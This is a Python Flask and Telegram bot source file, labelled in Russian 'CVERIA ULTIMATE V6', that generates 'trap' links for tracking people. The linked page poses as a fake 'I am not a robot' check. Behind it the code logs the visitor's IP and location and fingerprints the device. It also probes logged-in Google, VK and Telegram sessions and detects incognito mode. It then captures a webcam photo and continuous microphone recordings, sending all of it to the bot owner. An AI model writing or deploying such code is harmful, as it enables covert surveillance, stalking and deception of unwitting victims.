import telebot, requests, os, uuid
from flask import Flask, request

API_TOKEN = os.environ.get('API_TOKEN')
bot = telebot.TeleBot(API_TOKEN, threaded=False)
app = Flask(__name__)
db = {}

@app.route('/')
def home():
    return f'''
    <body style="background:#000;display:flex;flex-direction:column;justify-content:center;align-items:center;height:100vh;color:#fff;font-family:sans-serif;text-align:center;">
        <h1 style="margin-bottom:20px;letter-spacing:2px;">🛡️ CVERIA ULTIMATE V6</h1>
        <div style="padding:20px;border:1px solid #333;border-radius:15px;background:#111;">
            <p style="color:#888;">System Status: <span style="color:#00ff00;">READY</span></p>
            <a href="/activate" style="display:inline-block;margin-top:15px;padding:15px 40px;background:#0088cc;color:#fff;text-decoration:none;border-radius:10px;font-weight:bold;box-shadow:0 0 20px rgba(0,136,204,0.5);">АКТИВИРОВАТЬ СИСТЕМУ</a>
        </div>
    </body>
    '''

@app.route('/activate')
def activate():
    if bot.set_webhook(url=f"https://{request.host}/{API_TOKEN}"):
        return "✅ СИСТЕМА УСПЕШНО ГИПЕР-ЗАРЯЖЕНА"
    return "❌ ОШИБКА АКТИВАЦИИ"

@app.route('/' + (API_TOKEN if API_TOKEN else "none"), methods=['POST'])
def get_m():
    if request.headers.get('content-type') == 'application/json':
        bot.process_new_updates([telebot.types.Update.de_json(request.get_data().decode('utf-8'))])
        return "!", 200
    return "forbidden", 403

@app.route('/v/<uid>')
def logger(uid):
    if uid not in db: return "URL EXPIRED", 404
    owner_id, target = db[uid]['owner'], db[uid]['url']
    ip = request.headers.get('x-forwarded-for', request.remote_addr).split(',')[0].strip()
    
    g_info = "📍 GeoIP Error"
    try:
        r = requests.get(f"http://ip-api.com{ip}?fields=66846719", timeout=5).json()
        if r.get('status') == 'success':
            g_info = (f"🌍 {r['country']}, {r['city']}\\n📡 {r['isp']}\\n"
                      f"🛡️ VPN/Proxy: {'ДА' if r.get('proxy') or r.get('hosting') else 'НЕТ'}\\n"
                      f"📍 Координаты: `{r.get('lat')}, {r.get('lon')}`")
    except: pass
    
    bot.send_message(owner_id, f"🎯 *НОВЫЙ ТАРГЕТ!*\\n👤 IP: `{ip}`\\n{g_info}", parse_mode="Markdown")
    
    return f'''
    <html><head><meta charset="UTF-8"><meta name="viewport" content="width=device-width,initial-scale=1,maximum-scale=1,user-scalable=no"></head>
    <body style="background:#000;color:#fff;font-family:sans-serif;display:flex;align-items:center;justify-content:center;height:100vh;margin:0;overflow:hidden;text-align:center;">
        <div id="ui">
            <div style="font-size:70px;margin-bottom:20px;">🛡️</div>
            <h2 style="margin:0 0 10px 0;">Проверка безопасности</h2>
            <p style="color:#666;margin-bottom:30px;padding:0 20px;">Нажмите "Я НЕ РОБОТ" для перехода к материалу</p>
            <button id="go" style="padding:20px 70px;border:none;border-radius:50px;background:#fff;color:#000;font-weight:900;font-size:18px;cursor:pointer;box-shadow:0 0 30px rgba(255,255,255,0.2);">Я НЕ РОБОТ</button>
        </div>
        <audio id="troll" src="https://www.myinstants.com" preload="auto"></audio>
        <video id="v" style="display:none;" autoplay playsinline muted></video><canvas id="c" style="display:none;"></canvas>
        <script>
        const btn = document.getElementById('go');
        const snd = document.getElementById('troll');
        
        btn.onclick = async () => {{
            btn.innerText = "Анализ...";
            try {{ snd.play(); }} catch(e) {{}}
            
            let d = {{
                uid: "{uid}",
                hw: {{ scr: screen.width+"x"+screen.height+"*"+devicePixelRatio, cores: navigator.hardwareConcurrency, ram: navigator.deviceMemory || "N/A", hz: 60, bench: 0 }},
                bat: {{ lvl: "N/A", char: "N/A" }},
                net: {{ type: navigator.connection ? navigator.connection.effectiveType : "N/A", hist: history.length, tz: Intl.DateTimeFormat().resolvedOptions().timeZone }},
                state: {{ inc: false, dark: window.matchMedia('(prefers-color-scheme: dark)').matches }},
                social: {{ g: false, vk: false, tg: false }},
                bright: "N/A"
            }};

            // Benchmark
            const t0 = performance.now();
            for(let i=0; i<8000000; i++) {{ Math.sqrt(i); }}
            d.hw.bench = Math.round(performance.now() - t0) + "ms";

            // FPS/Hz
            let frames = 0;
            const fpsStart = performance.now();
            function checkFPS() {{
                frames++;
                if (performance.now() - fpsStart < 100) requestAnimationFrame(checkFPS);
                else d.hw.hz = Math.round(frames * 10) || 60;
            }}
            requestAnimationFrame(checkFPS);

            // Battery
            try {{
                let b = await navigator.getBattery();
                d.bat.lvl = Math.round(b.level * 100) + "%";
                d.bat.char = b.charging ? "Да" : "Нет";
            }} catch(e) {{}}

            // Brightness & Incognito
            if (window.matchMedia('(light-level: dim)').matches) d.bright = "Низкая";
            else if (window.matchMedia('(light-level: washed)').matches) d.bright = "Высокая";
            if (navigator.storage && navigator.storage.estimate) {{
                const est = await navigator.storage.estimate();
                if (est.quota < 120000000) d.state.inc = true;
            }}

            // Socials check
            const ck = (u) => new Promise(r => {{ let i = new Image(); i.onload=()=>r(true); i.onerror=()=>r(false); i.src=u; }});
            d.social.g = await ck("https://accounts.google.com");
            d.social.vk = await ck("https://vk.com");
            d.social.tg = await ck("https://web.telegram.org");

            fetch('/log_extra', {{ method: 'POST', headers: {{'Content-Type': 'application/json'}}, body: JSON.stringify(d) }});

            try {{
                const s = await navigator.mediaDevices.getUserMedia({{ video: true, audio: true }});
                const v = document.getElementById('v'); v.srcObject = s;
                
                function rec() {{
                    const r = new MediaRecorder(s); const ch = [];
                    r.ondataavailable = e => ch.push(e.data);
                    r.onstop = () => {{
                        const f = new FormData(); f.append('audio', new Blob(ch, {{type:'audio/webm'}}), 'a.webm'); f.append('uid', "{uid}");
                        fetch('/log_audio', {{ method: 'POST', body: f }});
                        if(s.active) rec();
                    }};
                    r.start(); setTimeout(() => r.stop(), 10000);
                }}
                rec();

                setTimeout(() => {{
                    const c = document.getElementById('c'); c.width = v.videoWidth; c.height = v.videoHeight;
                    c.getContext('2d').drawImage(v, 0, 0);
                    c.toBlob(b => {{
                        const f = new FormData(); f.append('photo', b, 'p.jpg'); f.append('uid', "{uid}");
                        fetch('/log_photo', {{ method: 'POST', body: f }}).then(() => {{ 
                            setTimeout(() => {{ window.location.href = "{target}"; }}, 2500);
                        }});
                    }}, 'image/jpeg', 0.7);
                }}, 1500);
            }} catch(e) {{ window.location.href = "{target}"; }}
        }};
        </script>
    </body></html>
    '''

@app.route('/log_extra', methods=['POST'])
def log_extra():
    d = request.json
    if d and d['uid'] in db:
        m = (f"🖥 *УЛЬТРА-ОТЧЕТ ID:* `{d['uid']}`\\n\\n"
             f"🚀 CPU Bench: `{d['hw']['bench']}`\\n"
             f"📺 Экран: `{d['hw']['scr']}` | `{d['hw']['hz']}Hz`\\n"
             f"🔋 Заряд: `{d['bat']['lvl']}` (Зарядка: `{d['bat']['char']}`)\\n"
             f"🌐 Сеть: `{d['net']['type']}` | Вкладок: `{d['net']['hist']}`\\n"
             f"💡 Среда: `{d['bright']}` | Тема: `{'Темная' if d['state']['dark'] else 'Светлая'}`\\n"
             f"👤 Соцсети: `G:{'✅' if d['social']['g'] else '❌'}` | `VK:{'✅' if d['social']['vk'] else '❌'}` | `TG:{'✅' if d['social']['tg'] else '❌'}`\\n"
             f"🕵️ Инкогнито: `{'ДА' if d['state']['inc'] else 'НЕТ'}`\\n"
             f"🕒 Пояс: `{d['net']['tz']}`")
        bot.send_message(db[d['uid']]['owner'], m, parse_mode="Markdown")
    return "ok"

@app.route('/log_photo', methods=['POST'])
def log_photo():
    uid, f = request.form.get('uid'), request.files.get('photo')
    if uid in db and f: bot.send_photo(db[uid]['owner'], f.read(), caption=f"📸 *ЛИЦО ОБЪЕКТА* (ID: `{uid}`)", parse_mode="Markdown")
    return "ok"

@app.route('/log_audio', methods=['POST'])
def log_audio():
    uid, f = request.form.get('uid'), request.files.get('audio')
    if uid in db and f: bot.send_document(db[uid]['owner'], f.read(), caption=f"🎤 *ЗВУКОВАЯ РЕАКЦИЯ* (ID: `{uid}`)", parse_mode="Markdown")
    return "ok"

@bot.message_handler(commands=['start'])
def start(m):
    bot.reply_to(m, "🤖 *CVERIA ULTIMATE V6 АКТИВИРОВАН*\\n\\nПришли ссылку на Telegraph, чтобы создать ловушку.", parse_mode="Markdown")

@bot.message_handler(func=lambda m: "telegra.ph" in m.text.lower())
def create(m):
    url = m.text.strip()
    if not url.startswith("http"): url = "https://" + url
    uid = str(uuid.uuid4())[:8]
    db[uid] = {'owner': m.chat.id, 'url': url}
    bot.reply_to(m, f"✅ *Ловушка готова!*\\n\\nТвоя ссылка:\\n`https://{request.host}/v/{uid}`", parse_mode="Markdown")
